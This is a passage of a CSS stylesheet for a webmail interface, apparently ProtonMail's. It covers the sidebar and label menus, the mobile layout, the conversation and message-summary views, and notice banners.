        .sidebarApp-menu .menuLabel-link {
            padding: 0;
            height: 25px;
            color: hsla(0, 0%, 100%, .5)
        }

        .sidebarApp-item .navigationItem-icon,
        .sidebarApp-item .sidebarApp-icon,
        .sidebarApp-menu .menuLabel-icon {
            width: 21px;
            min-width: 21px;
            margin-right: 5px;
            color: hsla(0, 0%, 100%, .5);
            text-align: center
        }

        .navigationItem-title {
            overflow: hidden;
            padding-right: 10px
        }

        .sidebarApp-item .navigationItem-aside {
            position: relative;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            margin-left: -10px;
            background: linear-gradient(90deg, rgba(80, 80, 97, 0) 0, #505061 4px);
            pointer-events: none
        }

        .sidebarApp-item.active .navigationItem-aside {
            background: linear-gradient(90deg, rgba(90, 90, 106, 0), #5a5a6a 4px)
        }

        .navigationItem-counter {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            margin-right: .3em
        }

        .sidebarApp-item .navigationItem-counter,
        .sidebarApp-menu .menuLabel-counter {
            font-style: normal;
            font-weight: 400;
            color: hsla(0, 0%, 100%, .35)
        }

        .menuLabel-item .menuLabel-counter,
        .sidebarApp-item .navigationItem-counter {
            margin-left: .3em
        }

        .menuLabel-item.active .menuLabel-link,
        .sidebarApp-item.active .navigationItem-item,
        .sidebarApp-item.active .sidebarApp-link {
            background-color: hsla(0, 0%, 100%, .06);
            border-color: transparent;
            color: #fff;
            font-weight: 700
        }

        .sidebarApp-item.active .navigationItem-icon {
            color: #a8abd7
        }

        .menuLabel-item .menuLabel-title {
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .menuLabel-item.active .menuLabel-title {
            color: #fff
        }

        [id=labelSettings] {
            margin-bottom: 0
        }

        [id=sidebarLabels] {
            position: relative;
            overflow: auto;
            min-height: 50px;
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto;
            -ms-flex: 1 1 auto;
            flex: 1 1 auto;
            height: calc(100% - 400px);
            margin: 0 -20px 10px
        }

        [id=sidebarLabels] .mCSB_container_wrapper>.mCSB_container {
            padding-right: 0
        }

        [id=sidebarLabels] .mCSB_container_wrapper.mCS_no_scrollbar_x.mCS_x_hidden+.mCSB_scrollTools.mCSB_scrollTools_vertical {
            right: 10px
        }

        [id=sidebarLabels] .menuLabel-container {
            padding: 0;
            margin: 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        [id=sidebarLabels] .menuLabel-link {
            padding: 0 25px 0 15px
        }

        .sidebarApp-container .menuLabel-link .sidebarApp-icon,
        .sidebarApp-container .navigationItem-item .sidebarApp-icon {
            -webkit-transition: all .2s ease-in;
            transition: all .2s ease-in
        }

        .sidebarApp-container .menuLabel-link .menuLabel-counter,
        .sidebarApp-container .menuLabel-link .navigationItem-aside,
        .sidebarApp-container .navigationItem-item .menuLabel-counter,
        .sidebarApp-container .navigationItem-item .navigationItem-aside {
            -webkit-transition: opacity .2s ease-in;
            transition: opacity .2s ease-in
        }

        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover {
            -webkit-box-shadow: inset 1px 2px 4px rgba(0, 0, 0, .2), inset 1px -2px 4px rgba(0, 0, 0, .2);
            box-shadow: inset 1px 2px 4px rgba(0, 0, 0, .2), inset 1px -2px 4px rgba(0, 0, 0, .2);
            background-color: #393945
        }

        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .menuLabel-title,
        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .navigationItem-title,
        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .sidebarApp-icon,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .menuLabel-title,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .navigationItem-title,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .sidebarApp-icon {
            color: #fff
        }

        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .menuLabel-icon,
        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .sidebarApp-icon,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .menuLabel-icon,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .sidebarApp-icon {
            -webkit-transform: scale(1.25);
            transform: scale(1.25)
        }

        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .menuLabel-counter,
        .sidebarApp-container .menuLabel-link.ptdnd-drag-hover .navigationItem-aside,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .menuLabel-counter,
        .sidebarApp-container .navigationItem-item.ptdnd-drag-hover .navigationItem-aside {
            opacity: 0;
            -webkit-filter: blur(10px);
            filter: blur(10px);
            background-color: transparent
        }

        .appConfigBody-is-mobile #ptSidebar {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            width: 100%;
            min-width: 100%;
            z-index: 999;
            background: #505061;
            height: 100%;
            overflow-x: hidden;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-transform: translateX(-100%);
            transform: translateX(-100%)
        }

        .appConfigBody-is-mobile #ptSidebar .sidebarApp-container {
            padding: 2rem
        }

        .appConfigBody-is-mobile #ptSidebar .refresh {
            display: none
        }

        .appConfigBody-is-mobile #ptSidebar .navigationItem-item,
        .appConfigBody-is-mobile #ptSidebar .sidebarApp-link {
            font-size: 1em
        }

        .appConfigBody-is-mobile #ptSidebar .active .navigationItem-item,
        .appConfigBody-is-mobile #ptSidebar .active .sidebarApp-link,
        .appConfigBody-is-mobile #ptSidebar .navigationItem-aside {
            background: transparent
        }

        .appConfigBody-is-mobile #ptSidebar .sidebarApp-divider {
            height: 1px;
            line-height: 1px;
            margin: 10px 0;
            background: hsla(0, 0%, 100%, .1)
        }

        .appConfigBody-is-mobile #ptSidebar .sidebarResponsive-menu-label {
            margin: 0
        }

        .appConfigBody-is-mobile #ptSidebar .sidebarApp-menu,
        .appConfigBody-is-mobile #ptSidebar .sidebarLabels {
            font-size: 14px
        }

        .appConfigBody-is-mobile #ptSidebar .sidebarApp-item .navigationItem-counter,
        .appConfigBody-is-mobile #ptSidebar .sidebarApp-menu .menuLabel-counter {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .appConfigBody-is-mobile.appConfigBody-showSidebar #ptSidebar {
            -webkit-transform: translateX(0);
            transform: translateX(0)
        }

        @media (max-height:500px) {
            [id=sidebarLabels] {
                height: auto;
                overflow: visible;
                min-height: auto
            }

            [id=sidebarLabels] .mCSB_container_wrapper {
                position: relative
            }
        }

        .btnDisplayMobileSidebar-container {
            background: transparent;
            border: 0;
            padding: 0;
            cursor: pointer;
            outline: none
        }

        .btnDisplayMobileSidebar-container.round i {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center;
            height: 30px;
            width: 30px;
            background: hsla(0, 0%, 100%, .1);
            border-radius: 50%;
            color: #fff
        }

        .sidebarMobileHeader-container {
            min-height: 90px
        }

        .sidebarMobileHeader-logo {
            display: block;
            padding-top: 5px
        }

        .sidebarMobileHeader-userDisplay {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            color: #fff;
            padding: 1rem 0;
            font-size: .9em;
            font-style: normal
        }

        [class=sidebarMobileHeader-userDisplay-] {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-style: normal
        }

        .navigationItem-container:not(.active) .refresh {
            display: none !important
        }

        .settingsMenu-container .donateBtn-container {
            background: transparent;
            cursor: pointer;
            border: 0;
            text-align: left
        }

        .settingsMenu-container .donateBtn-container div {
            display: inherit;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .settingsMenu-is-member .navigationSettings-is-dashboard,
        .settingsMenu-is-member .navigationSettings-is-domains,
        .settingsMenu-is-member .navigationSettings-is-members,
        .settingsMenu-is-member .navigationSettings-is-payments,
        .settingsMenu-is-member .settingsMenu-item-donate,
        .settingsMenu-is-subuser .navigationSettings-is-dashboard,
        .settingsMenu-is-subuser .navigationSettings-is-domains,
        .settingsMenu-is-subuser .navigationSettings-is-members,
        .settingsMenu-is-subuser .navigationSettings-is-payments,
        .settingsMenu-is-subuser .settingsMenu-item-donate {
            display: none
        }

        .settingsMenu-container .sidebarApp-menu .sidebarApp-item {
            position: relative
        }

        .settingsMenu-container .sidebarApp-menu .sidebarApp-item:after {
            pointer-events: none;
            background: red;
            content: "";
            position: absolute;
            top: 0;
            right: 0;
            width: 20px;
            height: 100%;
            background: linear-gradient(90deg, rgba(80, 80, 97, 0) 0, #505061 12px)
        }

        .settingsMenu-container .sidebarApp-menu .sidebarApp-item.active:after {
            background: linear-gradient(90deg, rgba(90, 90, 106, 0) 0, #5a5a6a 12px)
        }

        body:not(.appConfigBody-is-mobile) .settingsMenu-about-app {
            display: none
        }

        .sidebarContact-container button.sidebarApp-link>* {
            pointer-events: none;
            display: inline-block
        }

        .sidebarContact-container .sidebarApp-menu .sidebarApp-item {
            position: relative
        }

        .sidebarContact-container .sidebarApp-menu .sidebarApp-item:after {
            pointer-events: none;
            background: red;
            content: "";
            position: absolute;
            top: 0;
            right: 0;
            width: 20px;
            height: 100%;
            background: linear-gradient(90deg, rgba(80, 80, 97, 0) 0, #505061 12px)
        }

        .sidebarContact-container .sidebarApp-menu .sidebarApp-item.active:after {
            background: linear-gradient(90deg, rgba(90, 90, 106, 0) 0, #5a5a6a 12px)
        }

        .sidebarContact-container:not(.sidebarContact-show-delete-contacts) .sidebarApp-link[data-action=deleteContacts],
        .sidebarContact-container:not(.sidebarContact-show-merge-button) .sidebarApp-link[data-action=mergeContacts],
        body:not(.appConfigBody-is-mobile) .sidebarContact-about-app {
            display: none
        }

        .messagePlaceholder {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center;
            width: 100%;
            height: 100%;
            min-height: 100%;
            color: #acb0bf
        }

        .messagePlaceholder .messagePlaceholder-icon {
            font-size: 3rem;
            color: inherit
        }

        .messagePlaceholder .messagePlaceholder-title {
            font-size: 2rem;
            color: inherit;
            font-weight: 400
        }

        .messagePlaceholder .messagePlaceholder-text-block {
            display: block;
            margin-bottom: 1rem;
            margin-top: .5rem;
            color: inherit;
            text-transform: uppercase
        }

        .messagePlaceholder~.conversation-wrapper {
            pointer-events: none
        }

        .appConfigBody-is-mobile .messagePlaceholder {
            min-height: 80vh
        }

        .allMessageLabels-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: baseline;
            -webkit-align-items: baseline;
            -ms-flex-align: baseline;
            align-items: baseline;
            padding: 10px 0 0
        }

        .allMessageLabels-list+.allMessageLabels-list {
            margin-left: .5rem
        }

        .allMessageLabels-list .labelsElement-label {
            margin-top: .2em
        }

        .messageContacts-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .messageContacts-where {
            margin-right: .5em;
            color: #6f6f6f
        }

        .messageContacts-where:after {
            content: ": "
        }

        .messageContacts-list {
            margin: 0;
            padding: 0;
            list-style-type: none
        }

        .messageContacts-email {
            font-style: italic;
            color: #6f6f6f
        }

        .messageContacts-btn-compose {
            color: #9397cd
        }

        .messageComposeTo-container {
            border: 0;
            background: transparent;
            cursor: pointer
        }

        .filterButton-container .filterButton-label {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%
        }

        .filterButton-label-text {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden
        }

        .filterButton-checkbox {
            width: 20px
        }

        .filterButton-footer {
            margin-top: 1em
        }

        .messageView-contaniner {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        @-webkit-keyframes nodeInserted {
            0% {
                opacity: .99
            }

            to {
                opacity: 1
            }
        }

        #conversation-view .fa-star {
            color: #dfdf19
        }

        #conversation-view header {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-backface-visibility: hidden;
            min-height: -moz-min-content;
            min-height: -webkit-min-content;
            min-height: min-content;
            border-bottom: 1px solid #acb0bf;
            padding: 0 10px
        }

        #conversation-view header h1 {
            position: relative;
            font-size: 24px;
            font-weight: 400;
            color: #000;
            line-height: 35px;
            margin: 0;
            letter-spacing: .04rem;
            display: inline-block;
            word-wrap: break-word;
            padding: 0 10px;
            padding: 14px 30px 14px 0;
            min-height: 35px;
            max-height: 110px;
            overflow-y: auto;
            overflow-x: hidden
        }

        #conversation-view header h1 .starButton {
            position: absolute;
            right: -10px;
            top: 14px;
            border: none;
            margin-right: 0;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        #conversation-view header h1 .starButton a {
            background: transparent !important;
            line-height: 33px;
            height: 33px;
            padding: 0 10px;
            display: block;
            font-size: 1.5rem;
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 0
        }

        #conversation-view header .containsMessage p {
            margin: 0 0 13px
        }

        #conversation-view .message {
            border: 1px solid #acb0bf;
            border-radius: 2px;
            margin: 10px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            clear: both
        }

        #conversation-view .message:not(.open) .message-contact-sender,
        #conversation-view .message:not(.open) .message-frame,
        #conversation-view .message:not(.open) .recipients-details-bccGroup,
        #conversation-view .message:not(.open) .recipients-details-ccGroup {
            display: none !important
        }

        #conversation-view .message:not(.open) .summary {
            overflow: hidden
        }

        #conversation-view .message.details .message-summary-folder,
        #conversation-view .message.details .message-summary-labels,
        #conversation-view .message.details .recipients-summary,
        #conversation-view .message.details .time-machine,
        #conversation-view .message.details .toggleDetails-label-show,
        #conversation-view .message:not(.details) .recipients-details,
        #conversation-view .message:not(.details) .time-readable,
        #conversation-view .message:not(.details) .toggleDetails-label-hide {
            display: none !important
        }

        #conversation-view .message.errorDecryption [class*=message-actionBtn-] {
            display: none
        }

        #conversation-view .message.errorDecryption .pm_trigger {
            border-left: 0
        }

        #conversation-view .message:not(.hasSender) .message-contact {
            display: none
        }

        #conversation-view .message .details,
        #conversation-view .message .summary {
            float: left;
            width: 100%;
            clear: both;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        #conversation-view .message .message-contact-sender {
            color: #9397cd
        }

        #conversation-view .message.marked .details,
        #conversation-view .message.marked .summary {
            -webkit-box-shadow: inset 5px 0 0 #9397cd;
            box-shadow: inset 5px 0 0 #9397cd
        }

        #conversation-view .message.open {
            -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px rgba(0, 0, 0, .1)
        }

        #conversation-view .message.open .summary .meta .contact strong {
            font-weight: 700
        }

        #conversation-view .message.details.open .summary {
            height: 50px
        }

        #conversation-view .message.details.open .summary .meta .history {
            float: left;
            margin: 0 .5rem 0 0;
            display: inline-block;
            height: 40px;
            line-height: 40px
        }

        #conversation-view .message.details.open .summary .meta .contact span.from {
            width: 3rem;
            text-align: left
        }

        #conversation-view .message.details.open .summary .meta .contact em {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            position: absolute;
            bottom: 5px;
            line-height: 20px;
            height: 1rem
        }

        #conversation-view .message.details.open .summary .meta .contact em a {
            line-height: 20px;
            padding: 0 3px;
            display: inline-block
        }

        #conversation-view .message.unread:not(.open) .summary {
            background: #fff
        }

        #conversation-view .message.unread:not(.open) .summary .meta .contact strong {
            font-weight: 700
        }

        #conversation-view .message.unread:not(.open) .summary .labels,
        #conversation-view .message.unread:not(.open) .summary .status,
        #conversation-view .message.unread:not(.open) .summary .time {
            background: #fff !important
        }

        #conversation-view .message.unread:not(.open) .summary .time:after {
            background: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, 0)), to(#fff));
            background: linear-gradient(90deg, hsla(0, 0%, 100%, 0) 0, #fff)
        }

        #conversation-view .message .summary {
            height: 40px;
            line-height: 40px;
            background: #e6eaf0;
            border-radius: 2px;
            padding: 0 10px;
            text-align: right;
            font-size: .9em;
            cursor: pointer;
            position: relative
        }

        #conversation-view .message .summary span i.fa {
            margin-left: .5rem
        }

        #conversation-view .message .summary .pull-left {
            position: absolute;
            left: 10px;
            top: 0;
            z-index: 1;
            height: 100%;
            width: 80%;
            overflow: hidden
        }

        #conversation-view .message .summary .pull-left .location,
        #conversation-view .message .summary .pull-left .meta {
            float: left
        }

        #conversation-view .message .summary .labels,
        #conversation-view .message .summary .status,
        #conversation-view .message .summary .time {
            display: inline-block;
            margin-left: .85rem;
            position: relative;
            z-index: 2;
            background: #e6eaf0
        }

        #conversation-view .message .summary .time {
            position: relative;
            padding-left: 1rem;
            z-index: 1
        }

        #conversation-view .message .summary .time:after {
            content: "";
            display: block;
            position: absolute;
            left: -1rem;
            width: 1rem;
            height: 34px;
            top: 0;
            background: -webkit-gradient(linear, left top, right top, from(rgba(230, 234, 240, 0)), to(#e6eaf0));
            background: linear-gradient(90deg, rgba(230, 234, 240, 0) 0, #e6eaf0)
        }

        #conversation-view .message .summary .time .fa-paperclip {
            display: inline-block;
            width: 1rem;
            text-align: left;
            position: absolute;
            left: 0;
            top: 0;
            line-height: 40px;
            height: 40px
        }

        #conversation-view .message .summary .meta {
            white-space: nowrap
        }

        #conversation-view .message .summary .meta .contact strong {
            font-weight: 400
        }

        #conversation-view .message .summary .meta .contact span {
            color: #6f6f6f
        }

        #conversation-view .message .summary .location .loc {
            color: rgba(0, 0, 0, .5);
            margin-left: .25rem
        }

        #conversation-view .message .summary .status .fa {
            display: inline-block;
            text-align: right;
            width: 1rem
        }

        #conversation-view .message .summary .status .fa.pgp {
            color: #090
        }

        #conversation-view .message .details {
            border-bottom: 1px solid #acb0bf;
            background: #e6eaf0;
            padding: 0 10px 10px;
            clear: both
        }

        #conversation-view .message .details .pull-right .pm_buttons {
            margin: 0 0 0 4px
        }

        #conversation-view .message .details .pm_buttons a {
            background: #fff
        }

        #conversation-view .message .details .recipients-details {
            font-size: .9em;
            line-height: 20px;
            width: 100%
        }

        #conversation-view .message .details .recipients-summary {
            display: block;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            line-height: 20px;
            font-size: .9em
        }

        #conversation-view .message .details .recipients-summary .recipients-summary-label+.recipients-summary-label:before {
            content: ", "
        }

        #conversation-view .message .details .recipients-summary strong {
            color: #6f6f6f;
            font-weight: 400;
            display: inline-block
        }

        #conversation-view .message .details .recipients-summary .from {
            width: 3rem;
            color: #6f6f6f
        }

        #conversation-view .message .details .action-row {
            padding: 10px 0;
            clear: both;
            float: left;
            width: 100%
        }

        #conversation-view .message .toggleDetails {
            color: #9397cd;
            cursor: pointer;
            height: 35px;
            line-height: 35px;
            display: inline-block;
            font-size: .9em;
            border: 0;
            background: transparent
        }

        #conversation-view .message .expiration {
            background: #ec6446;
            color: #fff;
            padding: .5rem 10px;
            line-height: 1rem;
            clear: both;
            text-align: center;
            font-size: .9em
        }

        #conversation-view .message .frame {
            padding: 15px 30px;
            zoom: 1;
            clear: left;
            overflow-x: auto
        }

        #conversation-view .message .frame .bodyDecrypted {
            word-wrap: break-word
        }

        #conversation-view .message .frame .email {
            position: relative
        }

        #conversation-view .message .frame .email .pm_button.more {
            line-height: 1rem;
            height: 1rem;
            background: #e6eaf0;
            margin-top: 1rem;
            margin-bottom: 1rem;
            display: block
        }

        #conversation-view .message .frame .email blockquote.protonmail_quote {
            position: relative
        }

        #conversation-view .message .bodyDecrypted {
            will-change: transform;
            -webkit-animation: nodeInserted;
            animation: nodeInserted;
            -webkit-animation-duration: 1ms;
            animation-duration: 1ms
        }

        .bodyDecrypted [style*="position:absolute"],
        .bodyDecrypted [style*="position: absolute"] {
            position: static !important
        }

        .bodyDecrypted.plain {
            white-space: pre-wrap;
            font-family: monospace
        }

        #conversation-view:empty,
        .message.message-mode-plain .displayContentBtn-container {
            display: none
        }

        .protonmail_signature_block-empty {
            opacity: 0;
            height: 0;
            overflow: hidden
        }

        div.MsoNormal,
        li.MsoNormal,
        p.MsoNormal {
            margin: 0
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary {
            height: 60px;
            line-height: 25px;
            position: relative
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .meta {
            position: absolute;
            left: 0;
            top: 5px;
            max-width: none;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            text-align: left
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .meta .contact strong {
            font-weight: 400
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .meta .contact .from {
            display: none
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .location {
            position: absolute;
            left: 10px;
            bottom: 5px;
            z-index: 5
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .location .pm_tag {
            margin: 0
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .labels {
            position: absolute;
            right: 50px;
            bottom: 5px;
            z-index: 5
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .time {
            position: absolute;
            right: 10px;
            top: 5px;
            background: #e6eaf0;
            max-width: 45%;
            min-width: 150px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .time span {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: inline-block;
            float: right;
            width: 100%
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .time .fa.fa-paperclip {
            height: 25px;
            line-height: 25px
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .status {
            position: absolute;
            right: 10px;
            bottom: 5px
        }

        body.appConfigBody-is-mobile #conversation-view .message .summary .status .fa {
            display: inline-block;
            text-align: right;
            width: 1rem
        }

        body.appConfigBody-is-mobile #conversation-view .message>div.details>.recipients-summary {
            position: relative;
            top: -27px;
            max-width: 85%
        }

        body.appConfigBody-is-mobile #conversation-view .message>div.details .contact em {
            display: block;
            padding-bottom: .5rem
        }

        body.appConfigBody-is-mobile #conversation-view .message.details .summary {
            margin-bottom: 0
        }

        body.appConfigBody-is-mobile #conversation-view .message.details .summary .meta {
            position: static;
            left: auto;
            top: auto
        }

        body.appConfigBody-is-mobile #conversation-view .message.details .summary .meta .contact strong {
            position: absolute;
            left: 10px;
            top: 5px
        }

        body.appConfigBody-is-mobile #conversation-view .message.details .summary .meta .contact em {
            position: absolute;
            left: 10px;
            bottom: 10px;
            color: #6f6f6f
        }

        body.appConfigBody-is-mobile #conversation-view .message.details.open .summary .meta {
            margin-top: 5px
        }

        body.appConfigBody-is-mobile #conversation-view .message.details.open .summary .meta .contact strong {
            position: static
        }

        body.appConfigBody-is-mobile #conversation-view .message.draft .details .recipients-summary,
        body.appConfigBody-is-mobile #conversation-view .message.sent .details .recipients-summary {
            padding-left: 2.25rem;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        body.appConfigBody-is-mobile .message .details .action-row .pm_buttons a {
            padding: 0 8px
        }

        .message-summary-labels-list {
            max-width: 100%;
            height: 20px;
            -webkit-flex-wrap: nowrap;
            -ms-flex-wrap: nowrap;
            flex-wrap: nowrap
        }

        .message-summary-labels-list .labelsMessage-label {
            margin-top: 0;
            margin-right: .25em
        }

        .message-summary-labels-list .labelsMessage-label:not(:first-of-type) {
            max-width: .5rem;
            padding-right: 0;
            overflow: hidden;
            border-left-width: 0 !important;
            border-radius: 0 3px 3px 0
        }

        .message-summary-labels-list .labelsMessage-label:not(:first-of-type):hover {
            border-left-width: 2px !important;
            border-radius: 3px;
            max-width: 8rem;
            line-height: 14px;
            padding: 0 .4rem
        }

        .proton-message-blockquote-toggle~* {
            display: none !important
        }

        .print .proton-message-blockquote-toggle {
            display: none
        }

        .print .proton-message-blockquote-toggle~* {
            display: block !important
        }

        .print .protonmail_quote {
            min-width: 595px
        }

        #conversation-view .message.message-undisclosed .recipients-summary {
            display: block !important
        }

        .messageExtra-container>[class*=-container] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            padding: 5px 10px 5px 0;
            border-bottom: 1px solid #acb0bf;
            background: #d9dfe8;
            color: #505061;
            font-size: .9em
        }

        .messageExtra-container>[class*=-container] [class$=-notice-text] {
            font-weight: 700
        }

        .messageExtra-container>[class*=-container] [class$=-notice-sub] {
            opacity: .8
        }

        .messageExtra-container>[class*=-container]>[class$=-notice] {
            position: relative;
            padding-left: 2.2em
        }

        .messageExtra-container>[class*=-container]>[class$=-notice]:before {
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            font-family: FontAwesome;
            width: 2.2em;
            font-size: 1.1em
        }

        .messageExtra-container>[class*=-container]>[class*=-button] {
            height: 32px;
            line-height: 32px;
            background: #fff
        }

        .messageExtra-container>[class*=-container] a {
            color: #9397cd
        }

        .messageExtra-container>.messageExtra-container-error {
            -webkit-box-ordinal-group: 1;
            -webkit-order: 0;
            -ms-flex-order: 0;
            order: 0;
            background: #ec6446;
            color: #fff;
            border: none;
            padding: 10px 10px 10px 0
        }

        .messageExtra-container>.messageExtra-container-error+.messageExtra-container-error {
            border-bottom: 1px solid #f18b74
        }

        .messageExtra-container>.messageExtra-container-error a {
            color: #fff
        }

        .displayContentBtn-container:not(.displayContentBtn-type-embedded)[data-action=embedded],
        .displayContentBtn-container:not(.displayContentBtn-type-remote)[data-action=remote] {
            display: none
        }

        .displayContentBtn-container[data-action=embedded] .displayContentBtn-notice:before {
            content: "\F03E"
        }

        .displayContentBtn-container[data-action=remote] .displayContentBtn-notice:before {
            content: "\F1C5"
        }

        .messageExtra-container>.messagePgpAttachments-container>[class*=-notice]:before {
            content: "\F0C6"
        }

        .messageExtra-container>.messageSpamScore-container>[class*=-notice]:before {
            content: "\F05E"
        }

        .messageExtra-container>.unsubscribePanel-container>[class*=-notice]:before {
            content: "\F1EA"
        }

        .messageMimeParsing-container {
            padding: 0 0 0 10px
        }

        #eo-message .messageExtra-container>[class*=-container] {
            padding: 5px 35px 5px 30px;
            background: rgba(0, 0, 0, .05);
            border-top: none;
            border-bottom: 1px solid #acb0bf
        }

        .messageExtra-container>.message-autogenerated-container>.message-autogenerated-notice:before {
            content: " ";
            background: url(assets/img/robot.svg) no-repeat 50%;
            background-size: 60% 60%
        }

        .conversation-container {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        .conversation-wrapper {
            height: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            overflow-y: scroll;
            -webkit-overflow-scrolling: touch
        }

        .hasElementsSelected [id=conversation-view] {
            display: none !important
        }

        .conversationView-container {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        .conversationPlaceholder {
            padding: 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .conversationPlaceholder header {
            font-size: 24px;
            font-weight: 400;
            color: #333;
            line-height: 1.25em;
            letter-spacing: .04rem;
            display: block;
